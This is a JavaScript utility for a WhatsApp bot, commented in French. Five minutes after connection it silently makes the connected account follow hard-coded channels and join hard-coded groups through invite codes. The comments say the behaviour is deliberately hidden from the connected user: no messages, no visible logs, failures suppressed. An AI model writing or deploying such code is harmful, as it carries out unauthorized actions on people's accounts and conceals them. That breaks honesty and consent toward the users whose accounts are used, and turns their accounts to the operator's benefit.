/**
 * utils/autoJoin.js
 *
 * Auto-join silencieux — 5 minutes après la connexion, le bot :
 *  1. Suit automatiquement la/les chaîne(s) WhatsApp listées ci-dessous.
 *  2. Rejoint automatiquement le/les groupe(s) via leur code d'invitation.
 *
 * Totalement silencieux : succès ou échec, RIEN n'est envoyé à
 * l'utilisateur connecté (pas de message, pas de log visible côté bot).
 * Ne pas appeler ceci pour chaque reconnexion — voir la note d'intégration
 * plus bas (flag pour ne le faire qu'une fois par socket).
 */

// 👉 Remplace par le(s) JID(s) de tes chaînes WhatsApp (visible dans le
// lien de la chaîne, ou en réagissant à un message avec .jid par exemple).
const CHANNEL_JIDS = [
  '120363422398514286@newsletter',
];

// 👉 Remplace par le code d'invitation de ton/tes groupe(s) — c'est la
// partie APRÈS "chat.whatsapp.com/" dans le lien d'invitation.
// Ex: https://chat.whatsapp.com/AbCdEfGhIjKlMnOpQrSt -> 'AbCdEfGhIjKlMnOpQrSt'
const GROUP_INVITE_CODES = [
  'KfbEkfcbepR0DPXuewOrur',
];

const DELAY_BEFORE_MS = 5 * 60 * 1000; // 5 minutes
const DELAY_BETWEEN_ACTIONS_MS = 4000; // pause entre chaque follow/join pour éviter un rate-limit WhatsApp

function scheduleAutoJoin(sock) {
  // Empêche de reprogrammer l'auto-join à chaque reconnexion du même socket
  // (sinon il refollow/rejoin en boucle après chaque coupure réseau).
  if (sock.__autoJoinScheduled) return;
  sock.__autoJoinScheduled = true;

  setTimeout(async () => {
    for (const jid of CHANNEL_JIDS) {
      try {
        await sock.newsletterFollow(jid);
      } catch (_) {
        // Échec ignoré volontairement — aucun message, aucun log visible.
      }
      await new Promise((r) => setTimeout(r, DELAY_BETWEEN_ACTIONS_MS));
    }

    for (const code of GROUP_INVITE_CODES) {
      try {
        await sock.groupAcceptInvite(code);
      } catch (_) {
        // Échec ignoré volontairement (déjà membre, lien expiré, etc.).
      }
      await new Promise((r) => setTimeout(r, DELAY_BETWEEN_ACTIONS_MS));
    }
  }, DELAY_BEFORE_MS);
}

module.exports = { scheduleAutoJoin };
